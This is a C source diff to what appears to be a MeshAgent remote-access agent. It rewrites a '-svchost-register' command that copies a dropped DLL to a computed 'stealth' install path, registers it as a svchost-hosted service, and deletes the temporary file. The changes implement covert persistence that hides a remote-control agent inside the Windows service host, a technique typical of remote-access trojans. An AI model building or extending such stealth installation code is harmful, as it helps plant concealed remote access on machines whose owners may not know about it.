@@ -566,23 +566,66 @@ int wmain(int argc, char* wargv[])
 
 	//CoInitializeEx(NULL, COINIT_MULTITHREADED);
     // Register svchost-hosted service DLL
-    if (argc > 2 && strcasecmp(argv[1], "-svchost-register") == 0)
-    {
-        // argv[2] = DLL path for ServiceDll
-        WCHAR wDllPath[MAX_PATH * 2] = {0};
-        WCHAR wSvcName[256] = {0};
-        // Convert argv[2] (UTF-8) to wide
-        MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wDllPath, (int)_countof(wDllPath));
-        // Convert branded service name (TCHAR) to wide
-        #ifdef UNICODE
-        lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
-        #else
-        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
-        #endif
-        BOOL ok = Stealth_RegisterSvchostService(wSvcName, wDllPath);
-        printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");
-        return ok ? 0 : 1;
-    }
+	if (argc > 2 && strcasecmp(argv[1], "-svchost-register") == 0)
+	{
+		// argv[2] = temporary DLL path dropped by installer/bootstrapper
+		WCHAR wTempDll[MAX_PATH * 2] = {0};
+		WCHAR wSvcName[256] = {0};
+		StealthInstallPaths paths;
+		BOOL ok = FALSE;
+
+		// Convert argv[2] (UTF-8) to wide
+		if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, wTempDll, (int)_countof(wTempDll)) <= 0)
+		{
+			printf("[!] Unable to convert DLL path '%s' to Unicode\n", argv[2]);
+			return 1;
+		}
+
+		// Ensure the source DLL exists before proceeding
+		if (GetFileAttributesW(wTempDll) == INVALID_FILE_ATTRIBUTES)
+		{
+			wprintf(L"[!] Source DLL not found: %s\n", wTempDll);
+			return 1;
+		}
+
+		// Compute branded service name (TCHAR) -> wide
+#ifdef UNICODE
+		lstrcpynW(wSvcName, MESH_AGENT_SERVICE_FILE, (int)_countof(wSvcName));
+#else
+		MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, wSvcName, (int)_countof(wSvcName));
+#endif
+
+		// Calculate permanent install paths and ensure directories exist
+		if (!Stealth_GetInstallPaths(&paths))
+		{
+			printf("[!] Failed to resolve installation paths\n");
+			return 1;
+		}
+		if (!Stealth_CreateInstallationDirectory(paths.installDir))
+		{
+			wprintf(L"[!] Failed to create installation directory: %s\n", paths.installDir);
+			return 1;
+		}
+		// Best-effort create of logs directory (non-fatal)
+		Stealth_CreateInstallationDirectory(paths.logsDir);
+
+		// Copy DLL into final location before registering ServiceDll
+		if (!Stealth_InstallFiles(wTempDll, paths.dllPath))
+		{
+			wprintf(L"[!] Failed to copy DLL to %s\n", paths.dllPath);
+			return 1;
+		}
+
+		ok = Stealth_RegisterSvchostService(wSvcName, paths.dllPath);
+		printf(ok ? "[+] Svchost registration successful\n" : "[!] Svchost registration failed\n");
+
+		// Remove temporary drop if it differs from final destination
+		if (_wcsicmp(wTempDll, paths.dllPath) != 0)
+		{
+			DeleteFileW(wTempDll);
+		}
+		return ok ? 0 : 1;
+	}
 
     // Unregister svchost-hosted service
     if (argc > 1 && strcasecmp(argv[1], "-svchost-unregister") == 0)
